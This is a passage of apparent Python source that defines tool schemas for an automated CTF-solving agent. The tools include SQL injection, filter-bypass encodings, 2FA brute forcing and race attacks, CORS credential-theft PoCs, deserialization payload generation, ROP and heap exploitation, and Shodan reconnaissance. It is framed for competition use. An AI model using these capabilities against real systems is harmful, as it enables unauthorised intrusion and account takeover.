         "text":{"type":"string"},"charset":{"type":"string"},
         "inject_headers":{"type":"string"},"boundary":{"type":"string"},
         "html":{"type":"string"},"prefix":{"type":"string"},
         "raw_emails":{"type":"array"},"ca_cert":{"type":"string"}
     },"required":["operation"]}},

    {"name":"source_audit",
     "description":"Automated source code security audit. find_sinks: detect dangerous functions (exec, eval, innerHTML, pickle.loads, os.system, render_template_string, sql execute with string concat). find_filters: spot input validation/blacklists to understand what to bypass. find_routes: extract all web endpoints. find_auth: locate auth checks. full_audit: run all. Essential first step when challenge provides source code.",
     "input_schema":{"type":"object","properties":{
         "path_or_content":{"type":"string","description":"File path or raw source code content"},
         "operation":{"type":"string","enum":["find_sinks","find_filters","find_routes","find_auth","full_audit"]},
         "language":{"type":"string","description":"python, js, php, go, rust, c (optional, auto-detected)"}
     },"required":["path_or_content","operation"]}},

    {"name":"encoding_bypass",
     "description":"Generate filter-bypassing encodings of a payload. path_traversal: backslash (\\) instead of slash, URL double-encoding, null bytes (from notepad challenge: backslash bypassed slash filter). underscore: hex \\x5f, HTML entity &#95; (bypasses _ filter). xss_charset: UTF-7 encoding for XSS through HTML-escaping email parsers, base64 data URIs. command: base64-wrapped shell commands, IFS separator. sql: comment-based space bypass. header_inject: space-after-colon bypass for Python email header check, encoded-word RFC2047.",
     "input_schema":{"type":"object","properties":{
         "text":{"type":"string","description":"The payload to encode/transform"},
         "target_bypass":{"type":"string","enum":["path_traversal","underscore","xss_charset","command","sql","header_inject","all"]}
     },"required":["text","target_bypass"]}},

    {"name":"docker_recon",
     "description":"Analyze Docker configuration for attack surface. Extracts: exposed ports, environment variables/secrets, Redis/database config (maxmemory-policy=allkeys-lru reveals LRU side-channel opportunity!), volumes, network config, hardcoded credentials. Always run this when docker-compose.yml or Dockerfile is provided.",
     "input_schema":{"type":"object","properties":{
         "path":{"type":"string","description":"Path to docker-compose.yml, Dockerfile, or directory containing them"}
     },"required":["path"]}},

    {"name":"custom_cpu_emulate",
     "description":"Framework for emulating custom CPU architectures. From Pachinko Revisited: after reversing WASM→Python bitops, use this to write a CPU simulator with BitView helper class (bit-level state array access), clock stepping, port I/O, register dumping. Write your CPU simulation code in the 'code' param; BitView and helpers are auto-injected. Operations: run (execute), check (syntax only).",
     "input_schema":{"type":"object","properties":{
         "code":{"type":"string","description":"Python code implementing the CPU emulator. BitView class is pre-imported."},
         "operation":{"type":"string","enum":["run","check"]},
         "timeout":{"type":"integer","description":"Execution timeout (default 120s for complex emulation)"}
     },"required":["code","operation"]}},

    # ── Elite Intelligence Layer ─────────────────────────────────────────────
    {"name":"knowledge_store",
     "description":"Store a discovered fact in the cross-challenge CTF knowledge graph. Use for: discovered credentials, server tech stack, shared infrastructure, flag patterns, admin paths. These facts auto-inject into subsequent challenge solves in the same CTF.",
     "input_schema":{"type":"object","properties":{
         "ctf_name":{"type":"string"},"key":{"type":"string","description":"Fact key e.g. 'admin_password', 'server_tech', 'db_name'"},
         "value":{"type":"string","description":"Fact value"}
     },"required":["ctf_name","key","value"]}},

    {"name":"knowledge_get",
     "description":"Retrieve all known facts about a CTF from the knowledge graph. Call at solve start — previous challenges may have discovered creds, tech stack, infrastructure shared with this challenge.",
     "input_schema":{"type":"object","properties":{
         "ctf_name":{"type":"string"}
     },"required":["ctf_name"]}},

    {"name":"browser_agent",
     "description":"Playwright headless browser for JS-heavy web challenges. Handles SPAs, AJAX, login flows, CSRF tokens, DOM manipulation, WebSocket, cookie auth — things raw HTTP requests can't reach. Write Playwright Python in 'script' using page.click(), page.fill(), page.evaluate(), page.wait_for_selector(). Set capture_requests=True to intercept XHR/fetch. Set capture_screenshot=True to save a screenshot.",
     "input_schema":{"type":"object","properties":{
         "url":{"type":"string"},"script":{"type":"string","description":"Playwright Python code (page, browser, context available)"},
         "timeout":{"type":"integer"},"capture_requests":{"type":"boolean"},"capture_screenshot":{"type":"boolean"}
     },"required":["url","script"]}},

    {"name":"ghidra_decompile",
     "description":"Ghidra headless decompilation — returns semantically rich C pseudocode far superior to objdump/r2 assembly. Essential for hard rev. Falls back to r2 if Ghidra not installed. Set all_functions=True to decompile all functions in a small binary.",
     "input_schema":{"type":"object","properties":{
         "binary_path":{"type":"string"},"function_name":{"type":"string","description":"Function to decompile (default: main)"},
         "all_functions":{"type":"boolean","description":"Decompile all functions (slow for large binaries)"},
         "project_dir":{"type":"string"}
     },"required":["binary_path"]}},

    {"name":"ai_rename_functions",
     "description":"Use Claude to semantically rename sub_XXXX, var_8, etc. in decompiled code. Returns annotated code with meaningful names and inline comments. Feed it ghidra_decompile output. Dramatically reduces cognitive load on hard rev challenges.",
     "input_schema":{"type":"object","properties":{
         "decompiled_output":{"type":"string","description":"Raw decompiled C pseudocode with generic names"},
         "binary_path":{"type":"string","description":"Optional path for context"}
     },"required":["decompiled_output"]}},

    {"name":"libc_lookup",
     "description":"Look up the exact libc version from a leaked function address via libc.rip. Returns matching libc versions, download links, and key offsets (system, execve, /bin/sh, hooks). Essential after a GOT/PLT leak for ret2libc. Provide the raw hex leaked address.",
     "input_schema":{"type":"object","properties":{
         "leak_address":{"type":"string","description":"Leaked function address as hex e.g. '0x7f4a1b2c3d40'"},
         "symbol":{"type":"string","description":"Which function was leaked (default: puts)"},
         "extra_symbols":{"type":"object","description":"Additional leaked symbol:address pairs for disambiguation"}
     },"required":["leak_address"]}},

    {"name":"factordb",
     "description":"Look up RSA modulus factorization on factordb.com. ALWAYS try this first before any other RSA attack — the community may have already factored it. Returns p, q, and a ready-to-use decrypt snippet if successful.",
     "input_schema":{"type":"object","properties":{
         "n":{"type":"string","description":"RSA modulus as integer string"}
     },"required":["n"]}},

    {"name":"angr_solve",
     "description":"angr symbolic execution for automatic input synthesis in rev/pwn challenges. Finds inputs that reach a target address while avoiding bad addresses. Set find_addr to the address of the 'Correct!'/'You win!' block. Use custom_code for complex setups.",
     "input_schema":{"type":"object","properties":{
         "binary_path":{"type":"string"},"find_addr":{"type":"string","description":"Hex address of success state e.g. '0x401234'"},
         "avoid_addrs":{"type":"array","items":{"type":"string"},"description":"Hex addresses to avoid"},
         "stdin_len":{"type":"integer","description":"Length of symbolic stdin buffer (default 64)"},
         "custom_code":{"type":"string","description":"Extra angr Python code"},
         "timeout":{"type":"integer"}
     },"required":["binary_path"]}},

    {"name":"sqlmap",
     "description":"SQLMap for automatic SQL injection exploitation. Auto-discovers injectable params, database type, dumps tables and data. level=1-5, risk=1-3. Use data= for POST, cookie= for session auth.",
     "input_schema":{"type":"object","properties":{
         "target_url":{"type":"string"},"param":{"type":"string"},
         "data":{"type":"string"},"cookie":{"type":"string"},
         "level":{"type":"integer"},"risk":{"type":"integer"},
         "dbms":{"type":"string"},"extra_args":{"type":"string"}
     },"required":["target_url"]}},

    {"name":"ffuf",
     "description":"FFUF directory/file/parameter fuzzer. Replaces FUZZ in URL/headers/body. For: hidden endpoints, admin panels, backup files, param discovery. Falls back to gobuster.",
     "input_schema":{"type":"object","properties":{
         "url":{"type":"string","description":"URL with FUZZ placeholder e.g. 'https://ctf.io/FUZZ'"},
         "wordlist":{"type":"string"},"extensions":{"type":"string"},
         "method":{"type":"string"},"headers":{"type":"object"},
         "filter_codes":{"type":"string"},"match_codes":{"type":"string"},"data":{"type":"string"}
     },"required":["url"]}},

    {"name":"web_crawl",
     "description":"Burp-style web spider. Maps all routes, forms, input params, JS API endpoints. Flags interesting patterns (admin, flag, secret, token). Essential first step for black-box web.",
     "input_schema":{"type":"object","properties":{
         "base_url":{"type":"string"},"max_depth":{"type":"integer"},"max_pages":{"type":"integer"},
         "headers":{"type":"object"},"cookies":{"type":"object"},
         "find_patterns":{"type":"array","items":{"type":"string"}}
     },"required":["base_url"]}},

    {"name":"volatility",
     "description":"Volatility 3 memory forensics. Common plugins: windows.pslist, windows.cmdline, windows.filescan, windows.dumpfiles, windows.hashdump, linux.pslist, linux.bash, linux.malfind, mac.bash",
     "input_schema":{"type":"object","properties":{
         "image_path":{"type":"string"},"plugin":{"type":"string"},
         "args":{"type":"string"},"timeout":{"type":"integer"}
     },"required":["image_path","plugin"]}},

    {"name":"frida_trace",
     "description":"Frida dynamic instrumentation. Hooks functions, intercepts args/retvals, bypasses anti-debug/anti-tamper. Provide function_hooks for auto-hooking or write Frida JS in script.",
     "input_schema":{"type":"object","properties":{
         "binary_path":{"type":"string"},"pid":{"type":"integer"},
         "script":{"type":"string"},"function_hooks":{"type":"array","items":{"type":"string"}},
         "timeout":{"type":"integer"}
     },"required":[]}},

    {"name":"rank_hypotheses",
     "description":"Claude Haiku scores attack hypotheses by evidence strength. Returns top 5 attack vectors ranked by confidence with first-step tool calls. Call after pre_solve_recon.",
     "input_schema":{"type":"object","properties":{
         "challenge_description":{"type":"string"},"category":{"type":"string"},
         "recon_results":{"type":"string"}
     },"required":["challenge_description","category","recon_results"]}},

    {"name":"pre_solve_recon",
     "description":"Run ALL relevant recon in parallel. For pwn: checksec+strings+one_gadget+ROP. For web: headers+robots+tech detect. For forensics: exiftool+binwalk+entropy. For rev: file+nm+objdump. Call immediately after create_workspace.",
     "input_schema":{"type":"object","properties":{
         "binary_path":{"type":"string"},"url":{"type":"string"},"category":{"type":"string"}
     },"required":[]}},

    {"name":"detect_flag_format",
     "description":"Auto-detects the CTF flag format using session cache, description scan, 50+ CTF database, platform inference. Returns prefix, regex, example, confidence. The format is also pre-injected into every solve — use this to update the cache if you find a different prefix.",
     "input_schema":{"type":"object","properties":{
         "ctf_name":{"type":"string"},"description":{"type":"string"},
         "platform_type":{"type":"string"},"hint":{"type":"string"}
     },"required":[]}},

    {"name":"dlog",
     "description":"Discrete logarithm attacks for DH/ECC/DSA. Ops: baby_giant (BSGS, fast for small groups), pohlig_hellman (smooth-order groups), ecc_dlog (elliptic curve via SageMath), index_calculus (large prime fields), auto (tries all). Params: g,h,p (prime field) or Gx,Gy,Px,Py,a,b (ECC). Provide n=group_order and factors=[(q,e)...] for Pohlig-Hellman.",
     "input_schema":{"type":"object","properties":{
         "operation":{"type":"string","enum":["baby_giant","pohlig_hellman","ecc_dlog","index_calculus","auto"]},
         "g":{"type":"integer"},"h":{"type":"integer"},"p":{"type":"integer"},
         "n":{"type":"integer","description":"Group order (default: p-1 for prime fields)"},
         "factors":{"type":"array","description":"[(prime, exponent)...] factors of group order"},
         "Gx":{"type":"integer"},"Gy":{"type":"integer"},
         "Px":{"type":"integer"},"Py":{"type":"integer"},
         "a":{"type":"integer"},"b":{"type":"integer"},
         "order":{"type":"integer","description":"ECC curve order"}
     },"required":["operation"]}},

    {"name":"unicorn_emulate",
     "description":"Unicorn CPU emulator — safely run shellcode/bytecode without executing it. Arches: x86, x86_64, arm, arm64/aarch64, mips. shellcode_hex=hex bytes to load at code_addr. code=extra Unicorn Python API calls (uc available). Logs full register dump and instruction trace after emulation. Perfect for: custom VM bytecode, obfuscated shellcode, architecture challenges.",
     "input_schema":{"type":"object","properties":{
         "arch":{"type":"string","enum":["x86","x86_64","arm","arm64","aarch64","mips"]},
         "shellcode_hex":{"type":"string","description":"Hex string of bytes to emulate"},
         "code_addr":{"type":"integer","description":"Virtual address to load code (default 0x1000)"},
         "code":{"type":"string","description":"Extra Unicorn Python API code (uc object available)"},
         "registers":{"type":"object","description":"Register values to set before emulation"},
         "timeout":{"type":"integer"}
     },"required":[]}},

    {"name":"writeup_rag",
     "description":"Retrieve similar past CTF writeups from local ChromaDB vector store. Returns top-N writeups by semantic similarity to current challenge — Claude reads them for known-good approaches. Requires pre-built DB: call tool_index_writeups first. Empty result = DB not built yet.",
     "input_schema":{"type":"object","properties":{
         "description":{"type":"string","description":"Challenge description to search against"},
         "category":{"type":"string"},"ctf_name":{"type":"string"},
         "db_path":{"type":"string","description":"DB path (default ~/.ctf-solver/writeups.db)"},
         "n_results":{"type":"integer","description":"Number of writeups to return (default 5)"}
     },"required":["description","category"]}},

    {"name":"index_writeups",
     "description":"One-time setup: index a directory of CTF writeups (.md/.txt) into ChromaDB for RAG retrieval. Run once pointing at your writeup collection. After indexing, writeup_rag queries it automatically at solve start.",
     "input_schema":{"type":"object","properties":{
         "writeups_dir":{"type":"string","description":"Directory containing writeup files (searched recursively)"},
         "db_path":{"type":"string","description":"DB path (default ~/.ctf-solver/writeups.db)"}
     },"required":["writeups_dir"]}},

    {"name":"heap_analysis","description":"Heap inspection: bins, chunks, tcache_key, safe_link_decode, arena. Returns live glibc heap state for Claude to plan heap exploits.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["bins","chunks","tcache_key","safe_link_decode","arena"]},"args":{"type":"string"}},"required":["binary_path","operation"]}},
    {"name":"kernel_info","description":"Kernel recon: mitigations (SMEP/SMAP/KPTI), kallsyms, module_symbols, gadgets, seccomp_dump.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["mitigations","kallsyms","module_symbols","gadgets","seccomp_dump"]},"module_path":{"type":"string"},"args":{"type":"string"}},"required":["operation"]}},
    {"name":"seccomp_analyze","description":"Seccomp BPF filter dump and bypass paths (32-bit ABI, process_vm_writev, openat, etc).","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["dump","allowed"]}},"required":["binary_path"]}},
    {"name":"ret2dlresolve","description":"ret2dlresolve structure: resolv_addr, payload bytes, pwntools skeleton.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"target_func":{"type":"string"},"arg":{"type":"string"}},"required":["binary_path"]}},
    {"name":"srop","description":"SROP/sigreturn: frame (SigreturnFrame skeleton), find_syscall, gadgets.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["frame","find_syscall","gadgets"]},"arch":{"type":"string"}},"required":["binary_path","operation"]}},
    {"name":"afl_fuzz","description":"AFL++ fuzzing for N seconds, returns crash paths for aeg_pipeline or angr_solve.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"input_dir":{"type":"string"},"output_dir":{"type":"string"},"timeout_ms":{"type":"integer"},"run_seconds":{"type":"integer"},"extra_args":{"type":"string"}},"required":["binary_path"]}},
    {"name":"patchelf","description":"Patch binary to use downloaded libc/linker. After libc_lookup, download the libc then call this to match remote environment.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"libc_path":{"type":"string"},"ld_path":{"type":"string"},"operation":{"type":"string","enum":["patch","info","download_libc"]}},"required":["binary_path"]}},
    {"name":"coppersmith","description":"Coppersmith small-root attacks: small_e, partial_p, franklin_reiter, hastad, custom polynomial. All use SageMath small_roots().","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["small_e","partial_p","franklin_reiter","hastad","custom"]},"N":{"type":"integer"},"e":{"type":"integer"},"c":{"type":"integer"},"m_high":{"type":"integer"},"m_bits":{"type":"integer"},"p_high":{"type":"integer"},"p_bits":{"type":"integer"},"c1":{"type":"integer"},"c2":{"type":"integer"},"r":{"type":"integer"},"s":{"type":"integer"},"ciphertexts":{"type":"array"},"moduli":{"type":"array"},"polynomial":{"type":"string"},"X":{"type":"string"},"beta":{"type":"number"}},"required":["operation"]}},
    {"name":"ecdsa_lattice","description":"ECDSA lattice attack (HNP) for biased nonces. Provide signatures [(r,s,h)...], curve order n, leaked bits k.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["hnp","msb_leak","lsb_leak","lll_direct"]},"n":{"type":"integer"},"signatures":{"type":"array"},"k":{"type":"integer"},"leaks":{"type":"array"},"leak_type":{"type":"string"},"matrix_code":{"type":"string"}},"required":["operation"]}},
    {"name":"lll","description":"LLL lattice reduction and CVP/SVP. Claude provides matrix_rows. ops: lll, svp, cvp (needs target list).","input_schema":{"type":"object","properties":{"matrix_rows":{"type":"array"},"operation":{"type":"string","enum":["lll","svp","cvp"]},"target":{"type":"array"}},"required":["matrix_rows"]}},
    {"name":"aes_gcm_attack","description":"AES-GCM nonce_reuse (XOR ciphertexts, tag diff reveals H) and forbidden_attack (H recovery over GF(2^128)).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["nonce_reuse","forbidden_attack","key_recover"]},"c1":{"type":"string"},"c2":{"type":"string"},"t1":{"type":"string"},"t2":{"type":"string"}},"required":["operation"]}},
    {"name":"bleichenbacher","description":"RSA PKCS#1 v1.5 padding oracle: probe (detect via timing), skeleton (attack code with oracle() stub).","input_schema":{"type":"object","properties":{"host":{"type":"string"},"port":{"type":"integer"},"operation":{"type":"string","enum":["probe","skeleton"]},"n":{"type":"integer"},"e":{"type":"integer"},"c":{"type":"integer"}},"required":["host"]}},
    {"name":"http_smuggle","description":"HTTP request smuggling: detect (CL.TE/TE.CL timing probe), cl_te/te_cl/te_te (payload structure for tcp_connect).","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["detect","cl_te","te_cl","te_te"]}},"required":["target_url","operation"]}},
    {"name":"graphql","description":"GraphQL: introspect (full schema), batch (IDOR bypass), alias (rate limit bypass), find_mutations, custom.","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["introspect","batch","alias","find_mutations","field_suggest","custom"]},"query":{"type":"string"},"headers":{"type":"object"},"cookies":{"type":"object"}},"required":["target_url","operation"]}},
    {"name":"websocket_fuzz","description":"WebSocket: connect (dump messages), fuzz (send payloads), origin_bypass, inject (custom script with ws object).","input_schema":{"type":"object","properties":{"url":{"type":"string"},"operation":{"type":"string","enum":["connect","fuzz","origin_bypass","inject"]},"messages":{"type":"array"},"script":{"type":"string"},"timeout":{"type":"integer"}},"required":["url","operation"]}},
    {"name":"oauth_attack","description":"OAuth2/SAML: probe (endpoints), open_redirect, pkce_bypass, saml_bypass (XSW, comment injection, alg confusion).","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["probe","open_redirect","pkce_bypass","saml_bypass"]},"client_id":{"type":"string"},"redirect_uri":{"type":"string"}},"required":["target_url","operation"]}},
    {"name":"cache_poison","description":"Web cache poisoning: probe (unkeyed headers), poison (inject payload), param_cloaking (fat GET).","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["probe","poison","param_cloaking"]},"header":{"type":"string"},"value":{"type":"string"}},"required":["target_url","operation"]}},
    {"name":"shodan","description":"Shodan OSINT: search, host, ssl. Set SHODAN_API_KEY env var.","input_schema":{"type":"object","properties":{"query":{"type":"string"},"operation":{"type":"string","enum":["search","host","ssl"]},"api_key":{"type":"string"}},"required":["query"]}},
    {"name":"tls_decrypt","description":"Decrypt TLS PCAP using NSS keylog or RSA private key. Ops: decrypt, follow_stream, extract_files, check.","input_schema":{"type":"object","properties":{"pcap_path":{"type":"string"},"keylog_path":{"type":"string"},"privkey_path":{"type":"string"},"operation":{"type":"string","enum":["decrypt","follow_stream","extract_files","check"]},"filter_str":{"type":"string"}},"required":["pcap_path"]}},
    {"name":"deobfuscate","description":"Binary deobfuscation: detect (OLLVM/CFF), mba_simplify, cff_detect, decompile_miasm.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["detect","mba_simplify","cff_detect","decompile_miasm"]},"expression":{"type":"string"},"func_addr":{"type":"string"}},"required":["binary_path","operation"]}},
    {"name":"bytecode_disasm","description":"Bytecode disassembly: Python .pyc, Java .class, .NET IL, Lua. auto-detects from magic bytes.","input_schema":{"type":"object","properties":{"input_path":{"type":"string"},"language":{"type":"string","enum":["auto","python","java",".net","lua"]},"operation":{"type":"string"}},"required":["input_path"]}},
    {"name":"audio_steg","description":"Audio steg: analyze, spectrogram (PNG), dtmf (multimon-ng), lsb (WAV sample LSBs), strings.","input_schema":{"type":"object","properties":{"audio_path":{"type":"string"},"operation":{"type":"string","enum":["analyze","spectrogram","dtmf","lsb","strings"]}},"required":["audio_path","operation"]}},
    {"name":"git_forensics","description":"Git forensics: dangling objects, reflog, stash, secrets (grep history), orphan branches. operation=all runs all.","input_schema":{"type":"object","properties":{"repo_path":{"type":"string"},"operation":{"type":"string","enum":["all","dangling","reflog","stash","secrets","orphans"]}},"required":["repo_path"]}},
    {"name":"triton_taint","description":"Triton taint analysis for data flow tracing. Falls back to ltrace/strace if not installed.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"stdin_input":{"type":"string"},"operation":{"type":"string","enum":["trace","strace"]}},"required":["binary_path"]}},
    {"name":"aeg_pipeline","description":"Automatic Exploit Generation: AFL++ → crash triage → checksec → register state → angr_solve suggestion.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["run","triage"]},"fuzz_seconds":{"type":"integer"},"output_dir":{"type":"string"}},"required":["binary_path"]}},
    {"name":"docker_sandbox","description":"Docker-isolated exploit testing: setup, run_exploit (sandboxed, no network), local_test. Safely catches crashes.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["setup","run_exploit","local_test"]},"binary_path":{"type":"string"},"exploit_code":{"type":"string"},"libc_path":{"type":"string"},"timeout":{"type":"integer"}},"required":["operation"]}},
    {"name":"bindiff","description":"Binary diff between two versions to find patch-introduced vulnerability. diff, changed_functions, strings_diff.","input_schema":{"type":"object","properties":{"binary_a":{"type":"string"},"binary_b":{"type":"string"},"operation":{"type":"string","enum":["diff","changed_functions","strings_diff"]}},"required":["binary_a","binary_b"]}},
    {"name":"encrypted_store","description":"Persistent AES-256-GCM keystore for API keys/creds. Set CTF_SOLVER_MASTER env var. Ops: set, get, list, delete.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["set","get","list","delete"]},"key":{"type":"string"},"value":{"type":"string"},"store_path":{"type":"string"}},"required":["operation"]}},
    {"name":"differential_cryptanalysis","description":"Differential/linear cryptanalysis for custom CTF ciphers: collect_pairs, guess_key (last-round), linear_approx (bias table).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["collect_pairs","guess_key","linear_approx"]},"pairs":{"type":"array"},"target_diff":{"type":"integer"},"sbox":{"type":"array"}},"required":["operation"]}},

    # ── 53 gap-closing tools ──────────────────────────────────────────────────
    {"name":"2fa_bypass","description":"2FA/MFA bypass execution: probe (detect OTP type), race (20 concurrent requests to beat rate limit), bruteforce (try all N-digit codes), totp_predict (given base32 secret generate valid TOTPs ±2 windows), backup_bruteforce (common backup code formats).","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["probe","race","bruteforce","totp_predict","backup_bruteforce","response_manipulation"]},"target_url":{"type":"string"},"param":{"type":"string"},"method":{"type":"string"},"headers":{"type":"object"},"cookies":{"type":"object"},"secret":{"type":"string"},"token_length":{"type":"integer"}},"required":["operation"]}},
    {"name":"android_vuln","description":"Android vulnerability exploitation: scan (drozer attack surface), intent_hijack (exported activity/service/receiver), content_provider (SQLi + path traversal), deeplink (URL scheme injection), webview (JS bridge + file scheme XSS), backup (ADB backup extraction), adb_commands.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["scan","intent_hijack","content_provider","deeplink","broadcast","webview","backup","debug","adb_commands"]},"target":{"type":"string"},"package_name":{"type":"string"},"device":{"type":"string"},"extra":{"type":"string"}},"required":["operation"]}},
    {"name":"apk_analyze","description":"Android APK analysis: all (quick overview), decompile (jadx Java/Kotlin), manifest (permissions, exported components), dex (Dalvik bytecode), strings (hardcoded secrets/URLs/keys), find_vulns (exported activities, SQLi, WebView JS bridge, content providers), certificate.","input_schema":{"type":"object","properties":{"apk_path":{"type":"string"},"operation":{"type":"string","enum":["all","manifest","decompile","strings","certificate","find_vulns","dex","smali"]},"class_filter":{"type":"string"},"output_dir":{"type":"string"}},"required":["apk_path"]}},
    {"name":"apk_resign","description":"Full APK patch→rebuild→sign→install pipeline. Ops: full_pipeline (decompile+patch_ssl+rebuild+sign+install), decompile (apktool d), patch_ssl (inject network_security_config for mitmproxy), rebuild (apktool b), sign (jarsigner+zipalign), install (adb install).","input_schema":{"type":"object","properties":{"apk_path":{"type":"string"},"operation":{"type":"string","enum":["full_pipeline","decompile","patch_ssl","rebuild","sign","install"]},"patch_smali":{"type":"string"},"target_class":{"type":"string"},"output_path":{"type":"string"}},"required":["apk_path","operation"]}},
    {"name":"arm_rop","description":"ARM/AArch64/MIPS ROP chain builder via pwntools. Ops: chain (build ROP for goal: shell/ret2libc/syscall/execve), gadgets (dump useful gadgets via ROPgadget/ropper), checksec, ret2libc (find system+/bin/sh). Supports arm, arm64/aarch64, mips, mipsel.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["chain","gadgets","checksec","ret2libc","syscall"]},"libc_path":{"type":"string"},"arch":{"type":"string","enum":["arm","arm64","aarch64","mips","mipsel"]},"goal":{"type":"string"},"base_addr":{"type":"string"}},"required":["binary_path"]}},
    {"name":"asm_eval","description":"Evaluate x86/ARM/MIPS assembly snippet to compute final register state. Critical for asm1-asm4 type challenges. Ops: eval (run + dump registers), trace (step-by-step), find_ret (what does eax/rax equal). Uses Unicorn+Keystone, falls back to Python mini-evaluator.","input_schema":{"type":"object","properties":{"code_or_path":{"type":"string"},"operation":{"type":"string","enum":["eval","trace","find_ret","decompile_snippet"]},"arch":{"type":"string","enum":["x86","x86_64","arm","arm64","mips"]},"entry":{"type":"string"},"inputs":{"type":"object"},"steps":{"type":"integer"}},"required":["code_or_path"]}},
    {"name":"binary_patch","description":"Instruction-level binary patching for reversing challenges. Ops: find_checks (locate cmp+jcc license checks), nop (NOP out bytes), flip_jump (jz↔jnz, je↔jne flip), patch_bytes (write arbitrary hex), patch_ret (make function return constant), assemble (keystone asm → write bytes), info (function offsets).","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["find_checks","nop","flip_jump","patch_bytes","patch_ret","assemble","info"]},"offset":{"type":"string"},"size":{"type":"integer"},"new_bytes":{"type":"string"},"output_path":{"type":"string"},"function_name":{"type":"string"}},"required":["binary_path","operation"]}},
    {"name":"challenge_classifier","description":"Predict challenge technique from description + file list using keyword scoring. Returns ranked techniques (tcache_uaf, stack_bof, rsa_basic, ecc, ssti, sqli, deserialization, etc.), attack narrative, and tool recommendations. Fast, no API needed.","input_schema":{"type":"object","properties":{"description":{"type":"string"},"files":{"type":"array"},"category_hint":{"type":"string"},"use_api":{"type":"boolean"}},"required":["description"]}},
    {"name":"cloud_forensics","description":"Cloud log forensics: analyze (detect log type), cloudtrail (AWS CloudTrail event timeline, IAM actions, errors), gcp_audit (GCP audit logs), azure_activity (Azure activity), s3_access (S3 access logs), timeline (chronological event reconstruction).","input_schema":{"type":"object","properties":{"path":{"type":"string"},"operation":{"type":"string","enum":["analyze","cloudtrail","gcp_audit","azure_activity","s3_access","lambda_logs","timeline"]},"cloud":{"type":"string"},"keyword":{"type":"string"}},"required":["path","operation"]}},
    {"name":"cors_exploit","description":"CORS misconfiguration: probe (detect origin reflection/null/subdomain), exploit (credential theft PoC), subdomain_check (find takeable subdomains for CORS bypass), preflight (complex request bypass). Essential for insane web.","input_schema":{"type":"object","properties":{"target_url":{"type":"string"},"operation":{"type":"string","enum":["probe","exploit","subdomain_check","preflight"]},"origin":{"type":"string"},"credentials":{"type":"boolean"},"headers":{"type":"object"},"cookies":{"type":"object"}},"required":["target_url"]}},
    {"name":"cpp_vtable","description":"C++ vtable exploitation: detect (find vtable ptrs + RTTI in binary), type_confusion (unsafe cast patterns), vtable_overwrite (generate heap payload to hijack vptr), fake_vtable (build fake vtable struct), vptr_spray.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["detect","type_confusion","vtable_overwrite","fake_vtable","vptr_spray"]},"target_class":{"type":"string"},"rip_target":{"type":"string"}},"required":["operation"]}},
    {"name":"deserialization_exploit","description":"Java ysoserial + PHP phpggc deserialization payload generator. Languages: java, php, python, ruby, node. Ops: list (chains), generate (payload), detect (magic bytes).","input_schema":{"type":"object","properties":{"language":{"type":"string","enum":["java","php","python","ruby","node"]},"operation":{"type":"string","enum":["list","generate","detect"]},"gadget_chain":{"type":"string"},"command":{"type":"string"},"output_format":{"type":"string","enum":["base64","hex","raw"]},"extra_args":{"type":"string"}},"required":["language"]}},
    {"name":"disk_forensics","description":"Disk image forensics: analyze (partition table, filesystem type), mount (loop mount), recover_files (photorec/foremost), mft (NTFS Master File Table), deleted_files (fls/extundelete), timeline (mactime/log2timeline), keyword_search, strings.","input_schema":{"type":"object","properties":{"image_path":{"type":"string"},"operation":{"type":"string","enum":["analyze","mount","recover_files","mft","deleted_files","timeline","keyword_search","strings","hash_check"]},"partition":{"type":"integer"},"output_dir":{"type":"string"},"keyword":{"type":"string"}},"required":["image_path"]}},
    {"name":"dom_xss","description":"DOM XSS: analyze (find sinks + sources in JS), payloads (sink-specific bypass chains), dom_clobbering (id/name attribute clobber for XSS), mutation_xss (mXSS parser confusion, DOMPurify bypasses), csp_bypass (JSONP/base-uri/dangling markup), prototype_pollution_xss.","input_schema":{"type":"object","properties":{"operation":{"type":"string","enum":["analyze","payloads","dom_clobbering","mutation_xss","csp_bypass","prototype_pollution_xss"]},"url_or_path":{"type":"string"},"html_content":{"type":"string"},"sink":{"type":"string"},"extra_payloads":{"type":"string"}},"required":["operation"]}},
    {"name":"dotnet_decompile","description":"Full .NET C# decompilation via ilspycmd/ILSpy (vs bytecode_disasm which only does raw IL). Ops: decompile (full project), list_types, list_methods, method (single method), strings, resources, references, patch.","input_schema":{"type":"object","properties":{"binary_path":{"type":"string"},"operation":{"type":"string","enum":["decompile","list_types","list_methods","method","strings","resources","references","patch"]},"type_name":{"type":"string"},"method_name":{"type":"string"},"output_path":{"type":"string"}},"required":["binary_path"]}},
